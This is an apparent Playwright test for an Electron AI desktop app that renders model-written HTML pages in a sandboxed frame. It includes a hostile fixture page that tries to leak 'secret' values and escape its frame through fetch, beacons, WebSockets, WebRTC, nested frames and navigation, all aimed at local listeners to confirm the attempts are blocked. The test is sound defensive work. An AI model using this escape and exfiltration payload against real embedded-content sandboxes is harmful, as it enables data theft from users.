/** Pages in the desktop: real Electron/Python, a loopback model that writes page files, and a page that tries to get out. */
import { _electron as electron } from 'playwright';
import { expect } from '@playwright/test';
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { createServer as createTcpServer } from 'node:net';
import { createSocket } from 'node:dgram';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { mkdtempSync, mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';

const root = resolve(fileURLToPath(new URL('../..', import.meta.url)));
const folder = mkdtempSync(join(tmpdir(), 'astra-page-'));
const workspace = join(folder, 'workspace'); mkdirSync(workspace);
const output = join(root, 'output/playwright/page'); mkdirSync(output, { recursive: true });
const listen = server => new Promise(done => server.listen(0, '127.0.0.1', () => done(server.address().port)));

// Anything that reaches these three listeners left the page: HTTP and WebSocket, a TCP relay, and UDP.
const reached = [];
const probe = createServer((req, res) => { reached.push(`http ${req.method} ${req.url}`); res.setHeader('Access-Control-Allow-Origin', '*'); res.end('reached'); });
probe.on('upgrade', (req, socket) => { reached.push(`websocket ${req.url}`); socket.destroy(); });
const relay = createTcpServer(socket => { reached.push('tcp relay'); socket.destroy(); });
const datagrams = createSocket('udp4'); datagrams.on('message', () => reached.push('udp'));
const probePort = await listen(probe), relayPort = await listen(relay);
const udpPort = await new Promise(done => datagrams.bind(0, '127.0.0.1', () => done(datagrams.address().port)));
const out = `http://127.0.0.1:${probePort}`;


const demo = version => `<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Canvas</title>
<style>
  body { margin: 0; padding: 24px; background: rgb(16, 32, 48); color: rgb(240, 240, 240); font: 16px/1.5 sans-serif; }
  .accent { color: var(--astra-accent); }
</style></head>
<body class="canvas-body" data-kind="demo">
  <h1 id="title">CANVAS ${version}</h1>
  <p class="accent">已经点了 <strong id="n">0</strong> 次</p>
  <button id="more">加一</button> <a id="jump" href="#bottom">到底部</a>
  <div style="height: 2400px"></div><p id="bottom">BOTTOM</p>
  <script>let n = 0; document.getElementById('more').addEventListener('click', () => { document.getElementById('n').textContent = String(++n); });</script>
</body></html>`;
// Each attempt records what happened to it; the address it tried to reach says which one got through.
const escapeBody = `<p id="state">probing</p><pre id="result"></pre>
<form id="form" action="${out}/form" method="get"><input name="q" value="secret"></form>
<link rel="stylesheet" href="${out}/stylesheet">
<link rel="preconnect" href="http://127.0.0.1:${relayPort}">
<link rel="dns-prefetch" href="//127.0.0.1:${relayPort}">
<link rel="prefetch" href="${out}/prefetch">
<link rel="modulepreload" href="${out}/modulepreload.js">
<img src="${out}/img-tag" alt="">
<script src="${out}/script-tag"></script>
<style>@import url("${out}/css-import"); #state { background: url("${out}/css-url"); }</style>
<script>
(async () => {
  const result = {};
  const attempt = async (name, action) => { try { result[name] = String(await action()); } catch (error) { result[name] = 'blocked: ' + (error && error.name || error); } };
  await attempt('bridge', () => typeof window.astra);
  await attempt('parentDocument', () => parent.document.title);
  await attempt('parentBridge', () => typeof parent.astra);
  await attempt('topNavigation', () => { top.location = '${out}/top-navigation'; return 'sent'; });
  await attempt('storage', () => { localStorage.setItem('k', 'v'); return 'stored'; });
  await attempt('cookie', () => { document.cookie = 'k=v'; return document.cookie || 'empty'; });
  await attempt('popup', () => String(window.open('${out}/popup')));
  await attempt('fetch', () => fetch('${out}/fetch?secret=1').then(response => 'status ' + response.status));
  await attempt('xhr', () => new Promise((done, fail) => { const x = new XMLHttpRequest(); x.open('GET', '${out}/xhr'); x.onload = () => done('status ' + x.status); x.onerror = () => fail(new Error('network')); x.send(); }));
  await attempt('beacon', () => navigator.sendBeacon('${out}/beacon', 'secret'));
  await attempt('image', () => new Promise((done, fail) => { const i = new Image(); i.onload = () => done('loaded'); i.onerror = () => fail({ name: 'load error' }); i.src = '${out}/image-object'; }));
  await attempt('websocket', () => new Promise((done, fail) => { const w = new WebSocket('ws://127.0.0.1:${probePort}/websocket'); w.onopen = () => done('open'); w.onerror = () => fail({ name: 'socket error' }); }));
  await attempt('eventSource', () => new Promise((done, fail) => { const s = new EventSource('${out}/event-source'); s.onopen = () => done('open'); s.onerror = () => { s.close(); fail({ name: 'stream error' }); }; }));
  await attempt('dynamicScript', () => new Promise((done, fail) => { const s = document.createElement('script'); s.src = '${out}/dynamic-script'; s.onload = () => done('loaded'); s.onerror = () => fail({ name: 'load error' }); document.body.append(s); }));
  await attempt('importModule', () => import('${out}/module.js').then(() => 'imported'));
  await attempt('worker', () => { new Worker('${out}/worker.js'); return 'started'; });
  await attempt('evaluate', () => new Function('return 1 + 1')());
  await attempt('nestedFrame', () => new Promise(done => { const f = document.createElement('iframe'); f.src = '${out}/nested-frame'; f.onload = () => done('load event'); document.body.append(f); setTimeout(() => done('no load'), 800); }));
  await attempt('blankFrameNavigation', () => new Promise(done => { const f = document.createElement('iframe'); document.body.append(f); try { f.contentWindow.location = '${out}/blank-frame-navigation'; } catch (error) { done('blocked: ' + error.name); } setTimeout(() => done('sent'), 800); }));
  await attempt('blankFrameFetch', () => { const f = document.createElement('iframe'); document.body.append(f); return f.contentWindow.fetch('${out}/blank-frame-fetch').then(response => 'status ' + response.status); });
  await attempt('blankFrameWebrtc', () => { const f = document.createElement('iframe'); document.body.append(f); return typeof f.contentWindow.RTCPeerConnection + ' ' + typeof window[window.length - 1].webkitRTCPeerConnection; });
  // A frame written inline does run script, in a realm of its own.
  await attempt('inlineFrame', () => new Promise(done => {
    addEventListener('message', event => { if (event.data && event.data.inlineFrame) done(event.data.inlineFrame); });
    const f = document.createElement('iframe');
    f.srcdoc = '<script>const seen = [typeof RTCPeerConnection, typeof webkitRTCPeerConnection, typeof astra]; fetch("${out}/inline-frame-fetch").catch(() => {}); new Image().src = "${out}/inline-frame-image"; try { new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:${udpPort}" }] }).createDataChannel("x"); } catch (error) { seen.push(error.name); } parent.postMessage({ inlineFrame: seen.join(" ") }, "*");<\\/script>';
    document.body.append(f); setTimeout(() => done('no report'), 1500);
  }));
  await attempt('webrtc', () => new Promise(done => {
    const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:${udpPort}' }, { urls: 'turn:127.0.0.1:${relayPort}?transport=tcp', username: 'u', credential: 'p' }] });
    const seen = []; pc.onicecandidate = event => { if (event.candidate) seen.push(event.candidate.type); };
    pc.createDataChannel('x'); pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(error => done('blocked: ' + error.name));
    setTimeout(() => done('candidates: ' + (seen.join(',') || 'none')), 1500);
  }));
  await attempt('formSubmit', () => { document.getElementById('form').submit(); return 'sent'; });
  await attempt('download', () => { const a = document.createElement('a'); a.href = '${out}/download'; a.download = 'x'; document.body.append(a); a.click(); return 'clicked'; });
  await attempt('linkClick', () => { const a = document.createElement('a'); a.href = '${out}/link-click'; document.body.append(a); a.click(); return 'clicked'; });
  document.getElementById('result').textContent = JSON.stringify(result);
  document.getElementById('state').textContent = 'probed';
  // Last, because the frame does not survive it: the card tries to navigate itself away.
  setTimeout(() => { location.href = '${out}/self-navigation?secret=1'; }, 1200);
})();
</script>`;
const hostilePage = `<!doctype html><html><head><meta charset="utf-8"><title>out</title></head><body>${escapeBody}</body></html>`;
// The example the model itself is given when it reads the built-in skill.
const taught = /```html\n([\s\S]*?)\n```/.exec(readFileSync(join(root, 'agent/runtime/interactive_cards.md'), 'utf8'))[1];
const broken = `<!doctype html><title>broken</title><p>before</p><script>throw new Error('PAGE_FIXTURE_FAILURE');</script>`;
// What the model does when asked: one call that writes or edits a file, then a line of text.
const writes = {
  画布: { path: 'demo.page.html', content: demo('V1') },
  更新: { tool: 'edit_file', path: 'demo.page.html', old: 'CANVAS V1', new: 'CANVAS V2' },
  普通: { path: 'plain.html', content: '<!doctype html><h1>ORDINARY</h1>' },
  逃逸: { path: 'hostile.page.html', content: hostilePage },
  技能: { path: 'lesson.page.html', content: taught },
  报错: { path: 'broken.page.html', content: broken },
};
const requests = [];
const model = createServer(async (req, res) => {
  if (req.method === 'GET') { res.setHeader('Content-Type', 'application/json'); res.end(JSON.stringify({ data: [{ id: 'page-test' }] })); return; }
  if (!req.url.endsWith('/chat/completions')) { res.writeHead(404); res.end(); return; }
  let body = ''; for await (const part of req) body += part;
  const payload = JSON.parse(body); requests.push(payload);
  const lastUser = payload.messages.findLastIndex(message => message.role === 'user');
  const text = JSON.stringify(payload.messages[lastUser]?.content ?? '');
  const answered = payload.messages.slice(lastUser + 1).some(message => message.role === 'tool');
  const write = Object.entries(writes).find(([word]) => text.includes(word))?.[1];
  res.setHeader('Content-Type', 'text/event-stream');
  const chunk = (delta, finish_reason = null) => res.write('data: ' + JSON.stringify({ id: 'page-' + requests.length, object: 'chat.completion.chunk', created: Math.floor(Date.now() / 1000), model: 'page-test', choices: [{ index: 0, delta, finish_reason }] }) + '\n\n');
  if (write && !answered) {
    const { tool = 'write_file', ...args } = write;
    chunk({ role: 'assistant', tool_calls: [{ index: 0, id: 'page-call-' + requests.length, type: 'function', function: { name: tool, arguments: JSON.stringify(args) } }] });
    chunk({}, 'tool_calls');
  } else { chunk({ role: 'assistant', content: write ? `WROTE ${write.path}` : 'PLAIN_REPLY' }); chunk({}, 'stop'); }
  res.end('data: [DONE]\n\n');
});
const port = await listen(model);
writeFileSync(join(folder, '.env'), '');
writeFileSync(join(folder, 'settings.json'), JSON.stringify({ selected_model: 'page-test' }));
writeFileSync(join(folder, 'models.yaml'), `version: 1\nproviders:\n  test:\n    label: Local fixture\n    provider: openai-compatible\n    base_url: http://127.0.0.1:${port}/v1\n    api_key_env: ''\n    context_limit: 131072\n    capabilities: [tools, streaming]\nmodels:\n  page-test:\n    provider: openai-compatible\n    base_url: http://127.0.0.1:${port}/v1\n    api_key_env: ''\n    context_limit: 131072\n    capabilities: [tools, streaming]\n`);
const cleanEnv = Object.fromEntries(Object.entries(process.env).filter(([key]) => !/API_KEY|TOKEN|SECRET|^AGENT_|^ASTRA_|^LLM_|^SANDBOX_|^ELECTRON_/.test(key)));
const env = { ...cleanEnv, ASTRA_GUI_DISABLE_APPSHOT: '1', AGENT_PROJECT_ROOT: root, AGENT_PYTHON: process.env.AGENT_PYTHON || join(root, '.venv', process.platform === 'win32' ? 'Scripts/python.exe' : 'bin/python'), ASTRA_ENV_FILE: join(folder, '.env'), ASTRA_HOME: folder, AGENT_SETTINGS_PATH: join(folder, 'settings.json'), AGENT_SESSION_DIR: join(folder, 'sessions'), AGENT_TASK_DB: join(folder, 'tasks.db'), ASTRA_APPROVAL_DB: join(folder, 'approvals.db'), ASTRA_EVENT_DB: join(folder, 'events.db'), AGENT_MEMORY_PATH: join(folder, 'memory.db'), AGENT_LEARNING_PATH: join(folder, 'learning.db'), AGENT_SKILLS_PATH: join(folder, 'skills'), AGENT_MODELS_FILE: join(folder, 'models.yaml'), AGENT_USER_MODELS_FILE: join(folder, 'missing-models.yaml'), AGENT_LOG_DIR: join(folder, 'logs'), AGENT_MCP_CONFIG: join(folder, 'missing-mcp.json'), AGENT_TOOL_POLICY: 'locked', SANDBOX_DOCKER: 'false', SANDBOX_WORKDIR: workspace, ASTRA_WORKSPACE: workspace, LEARNING_REVIEW_AUTO: '0' };
const runFile = promisify(execFile);
async function bounded(promise, label, timeout) {
  let timer;
  try { return await Promise.race([promise, new Promise((_, reject) => { timer = setTimeout(() => reject(new Error(`${label} timed out after ${timeout} ms`)), timeout); })]); }
  finally { clearTimeout(timer); }
}
async function terminateFixture(app) {
  const child = app.process();
  if (child.exitCode !== null || child.signalCode !== null) return;
  const pid = child.pid;
  assert.ok(Number.isSafeInteger(pid) && pid > 0, 'only terminate this fixture Electron PID');
  if (process.platform === 'win32') { await runFile('taskkill.exe', ['/PID', String(pid), '/T', '/F'], { timeout: 5000, windowsHide: true }); return; }
  const { stdout } = await runFile('ps', ['-axo', 'pid=,ppid='], { timeout: 3000 });
  const rows = stdout.trim().split('\n').map(line => line.trim().split(/\s+/).map(Number));
  const owned = new Set([pid]);
  for (let changed = true; changed;) { changed = false; for (const [id, parent] of rows) if (owned.has(parent) && !owned.has(id)) { owned.add(id); changed = true; } }
  for (const id of [...owned].reverse()) { try { process.kill(id, 'SIGKILL'); } catch (error) { if (error.code !== 'ESRCH') throw error; } }
}

let app, failure, probed;
const errors = [], answered = [], checks = [];
const passed = name => { checks.push(name); console.log('PASS', name); };
try {
  // The listeners do hear what reaches them, so their silence later means something.
  await fetch(`${out}/control`);
  await new Promise(done => datagrams.send('control', udpPort, '127.0.0.1', done));
  await new Promise(done => setTimeout(done, 100));
  assert.deepEqual(reached.splice(0), ['http GET /control', 'udp']);

  app = await electron.launch({ args: [join(root, 'ui-gui')], env, timeout: 30000 });
  const page = await app.firstWindow(); page.setDefaultTimeout(30000);
  page.on('pageerror', error => errors.push(error.message));
  // A refused request is still announced; an answer or an opened socket means one got out.
  page.on('response', response => { if (/^https?:/i.test(response.url())) answered.push(response.url()); });
  page.on('websocket', socket => answered.push(socket.url()));
  const resize = async (width, height) => { await app.evaluate(({ BrowserWindow }, size) => BrowserWindow.getAllWindows()[0].setContentSize(...size), [width, height]); await page.waitForFunction(width => innerWidth === width, width); };
  await resize(1320, 900);
  console.log('START', folder);
  const composer = page.getByRole('textbox', { name: '消息', exact: true });
  const state = async () => page.evaluate(async () => { const boot = await window.astra.bootstrap(); return boot.sessions.find(item => item.id === boot.active); });
  const idle = async () => expect.poll(async () => { const current = await state(); return current?.status === 'ready' && !current.busy; }, { timeout: 30000 }).toBe(true);
  // Writing a file asks first; the person allows it, and the model then says what it wrote.
  const ask = async (text, path) => {
    await composer.fill(text); await page.getByRole('button', { name: '发送', exact: true }).click();
    await page.getByRole('button', { name: '允许一次', exact: true }).click({ timeout: 15000 });
    await expect(page.locator('.message.assistant').filter({ hasText: `WROTE ${path}` }).last()).toBeVisible();
    await idle();
  };
  const panel = page.locator('.details-panel'), preview = panel.locator('.file-preview-panel');
  const shown = () => preview.locator('h3').innerText();
  const frame = panel.locator('iframe.page-frame'), inside = frame.contentFrame();

  // The model writes a page file; the panel opens on it without being asked, and the page runs.
  await expect(panel).toHaveCount(0);
  await ask('画布', 'demo.page.html');
  await expect(frame).toHaveCount(1);
  assert.equal(await shown(), 'demo.page.html');
  assert.equal(readFileSync(join(workspace, 'demo.page.html'), 'utf8'), writes.画布.content);
  await expect(inside.getByRole('heading', { name: 'CANVAS V1' })).toBeVisible();
  await inside.getByRole('button', { name: '加一', exact: true }).click();
  await inside.getByRole('button', { name: '加一', exact: true }).click();
  await expect(inside.locator('#n')).toHaveText('2');
  // It is a document of its own: its doctype counts, its body is its own, and its styles are the only ones.
  const facts = await inside.locator('body').evaluate(body => ({
    mode: document.compatMode, title: document.title, lang: document.documentElement.lang, bodyClass: body.className, kind: body.dataset.kind,
    background: getComputedStyle(body).backgroundColor, padding: getComputedStyle(body).paddingTop, button: getComputedStyle(document.getElementById('more')).borderRadius,
  }));
  assert.deepEqual(facts, { mode: 'CSS1Compat', title: 'Canvas', lang: 'en', bodyClass: 'canvas-body', kind: 'demo', background: 'rgb(16, 32, 48)', padding: '24px', button: '0px' });
  // The app's colours are there for a page that wants them, under names of their own.
  const colours = () => Promise.all([
    page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--accent').trim()),
    inside.locator('html').evaluate(node => getComputedStyle(node).getPropertyValue('--astra-accent').trim()),
    inside.locator('html').evaluate(node => getComputedStyle(node).colorScheme),
    inside.locator('html').evaluate(node => getComputedStyle(node).getPropertyValue('--accent').trim()),
  ]);
  const [hostAccent, pageAccent, scheme, bare] = await colours();
  assert.deepEqual([pageAccent, scheme, bare], [hostAccent, 'light', '']);
  // A link inside the page scrolls to its place, and the page goes on running.
  await inside.locator('#jump').click();
  await expect.poll(() => inside.locator('html').evaluate(() => scrollY)).toBeGreaterThan(1000);
  await expect(inside.locator('#n')).toHaveText('2');
  await expect(preview.getByRole('status')).toHaveCount(0);
  await page.screenshot({ path: join(output, 'page.png') });
  passed('a page the model writes opens beside the conversation, runs as a document of its own with its own styles, can use the app colours, and scrolls to its own anchors');

  // A theme change reaches it without a restart; its source is one switch away, and it comes back fresh.
  await page.evaluate(() => { document.documentElement.dataset.theme = 'dark'; });
  await expect.poll(async () => (await colours()).slice(1, 3)).toEqual([await page.evaluate(() => getComputedStyle(document.documentElement).getPropertyValue('--accent').trim()), 'dark']);
  await expect(inside.locator('#n')).toHaveText('2');
  await page.evaluate(() => { document.documentElement.dataset.theme = 'system'; });
  await preview.getByRole('button', { name: '源码', exact: true }).click();
  await expect(frame).toHaveCount(0);
  await expect(preview.locator('pre.file-preview')).toContainText('<h1 id="title">CANVAS V1</h1>');
  await preview.getByRole('button', { name: '预览', exact: true }).click();
  await expect(inside.locator('#n')).toHaveText('0');
  // It can take the whole window, and gives the room back on Escape without closing.
  const widths = async () => { const box = await frame.boundingBox(); return [Math.round(box.width), await page.locator('.conversation').isVisible()]; };
  const [narrow] = await widths();
  await preview.getByRole('button', { name: '放大', exact: true }).click();
  await expect.poll(async () => (await widths())[1]).toBe(false);
  const [wide] = await widths();
  assert.ok(wide > narrow + 300 && wide > 900, `the page is ${wide}px wide after ${narrow}px`);
  await expect(inside.getByRole('heading', { name: 'CANVAS V1' })).toBeVisible();
  await page.screenshot({ path: join(output, 'page-wide.png') });
  await page.keyboard.press('Escape');
  await expect.poll(async () => (await widths())[1]).toBe(true);
  await expect(frame).toHaveCount(1);
  assert.equal((await widths())[0], narrow);
  passed('the page follows a theme change, shows its source, takes the whole window and gives it back');

  // The model rewrites the file: the page on screen is the new one. An ordinary HTML file changes nothing here.
  await ask('更新', 'demo.page.html');
  await expect(inside.getByRole('heading', { name: 'CANVAS V2' })).toBeVisible();
  await expect(inside.locator('#n')).toHaveText('0');
  await ask('普通', 'plain.html');
  assert.equal(await shown(), 'demo.page.html');
  await expect(inside.getByRole('heading', { name: 'CANVAS V2' })).toBeVisible();
  // The example the skill teaches works as written.
  await ask('技能', 'lesson.page.html');
  assert.equal(await shown(), 'lesson.page.html');
  await expect(inside.locator('#detail')).toHaveText(/^方案 A/);
  await inside.getByRole('button', { name: '方案 B' }).click();
  await expect(inside.locator('#detail')).toHaveText(/^方案 B/);
  await expect(inside.getByRole('button', { name: '方案 B' })).toHaveAttribute('aria-pressed', 'true');
  await page.screenshot({ path: join(output, 'page-lesson.png') });
  // Back in the list of files, each page is there to be opened again.
  await preview.getByRole('button', { name: '← 返回' }).click();
  await expect(panel.locator('.file-row')).toHaveText(['demo.page.html', 'lesson.page.html']);
  await panel.locator('.file-row').filter({ hasText: 'demo.page.html' }).click();
  await expect(inside.getByRole('heading', { name: 'CANVAS V2' })).toBeVisible();
  // The desktop's backend offers the model the skill by name; the text is sent only when the model reads it.
  const offered = JSON.stringify(requests[0].messages.filter(message => message.role === 'system'));
  assert.equal(offered.includes('- interactive-cards: '), true);
  assert.match(offered, /整页画布/);
  assert.equal(JSON.stringify(requests.map(request => request.messages.filter(message => message.role === 'system'))).includes('.page.html'), false);
  passed('a rewritten page is shown anew, an ordinary HTML file is left alone, the skill\'s own example runs as written, and pages are listed among the files');

  // A page whose script fails says so beside what it did draw.
  await ask('报错', 'broken.page.html');
  await expect(preview.getByRole('status')).toHaveText(/页面脚本出错：.*PAGE_FIXTURE_FAILURE/);
  await expect(inside.getByText('before', { exact: true })).toBeVisible();

  // A page that tries every way out. It learns nothing about the host, and nothing it sends arrives anywhere.
  await ask('逃逸', 'hostile.page.html');
  assert.equal(await shown(), 'hostile.page.html');
  await expect(inside.locator('#state')).toHaveText('probed', { timeout: 20000 });
  probed = JSON.parse(await inside.locator('#result').textContent());
  console.log('PROBED', JSON.stringify(probed));
  assert.equal(probed.bridge, 'undefined');
  for (const name of ['parentDocument', 'parentBridge', 'topNavigation', 'storage', 'cookie', 'fetch', 'xhr', 'image', 'websocket', 'eventSource', 'dynamicScript', 'importModule', 'evaluate', 'blankFrameFetch', 'webrtc'])
    assert.match(probed[name], /^blocked: /, `${name} must be refused: ${probed[name]}`);
  assert.equal(probed.popup, 'null');
  assert.doesNotMatch(probed.blankFrameWebrtc, /function/);
  assert.equal(probed.inlineFrame, 'undefined undefined undefined ReferenceError');
  // Then it navigates itself away: the host shows that it stopped, and no refused page in its place.
  await expect(preview.getByRole('status')).toHaveText(/页面已停止：它试图离开自己的框。/, { timeout: 20000 });
  await expect(frame).toHaveCount(0);
  await new Promise(done => setTimeout(done, 1500));
  assert.deepEqual(reached, [], 'nothing the page tried reached a listener');
  assert.deepEqual(answered, [], 'nothing the window asked for was answered');
  assert.equal(await page.evaluate(() => location.href), 'astra://app/index.html');
  await page.screenshot({ path: join(output, 'page-stopped.png') });
  // Run again by hand, it stops again and still reaches nothing.
  await preview.getByRole('button', { name: '重新运行', exact: true }).click();
  await expect(preview.getByRole('status')).toHaveText(/页面已停止：它试图离开自己的框。/, { timeout: 30000 });
  await new Promise(done => setTimeout(done, 1500));
  assert.deepEqual(reached, []);
  assert.deepEqual(answered, []);
  passed('a failing page reports its error, and a hostile page cannot see the bridge or the host page, store anything, open anything, or reach the network by any route it tried');
  // The failing page's own exception is the only one.
  assert.deepEqual([...new Set(errors)], ['PAGE_FIXTURE_FAILURE']);
} catch (error) {
  failure = error; console.error(error);
  if (app) await bounded((async () => {
    const page = await app.firstWindow();
    console.error((await page.locator('body').innerText()).slice(-2000));
    console.error('REACHED', JSON.stringify(reached), 'ANSWERED', JSON.stringify(answered), 'PROBED', JSON.stringify(probed), 'ERRORS', JSON.stringify(errors));
    await page.screenshot({ path: join(output, 'failure.png'), timeout: 2000 });
  })(), 'Failure diagnostics', 3000).catch(error => console.error(error));
} finally {
    if (app) {
    try { await bounded(app.close(), 'Electron close', 30000); }
    catch (error) { failure ||= error; console.error(error); await bounded(terminateFixture(app), 'Fixture process cleanup', 6000).catch(error => { failure ||= error; console.error(error); }); }
  }
  for (const server of [model, probe, relay]) await bounded(new Promise((done, reject) => { server.close(error => error ? reject(error) : done()); server.closeAllConnections?.(); }), 'Fixture listener close', 3000).catch(error => { failure ||= error; console.error(error); });
  datagrams.close();
}
writeFileSync(join(output, 'page-result.json'), JSON.stringify({ checks, errors, reached, answered, probed, folder, success: !failure, ...(failure ? { failure: String(failure) } : {}) }, null, 2));
if (failure) throw failure;
console.log(JSON.stringify({ checks: checks.length, output, folder }));
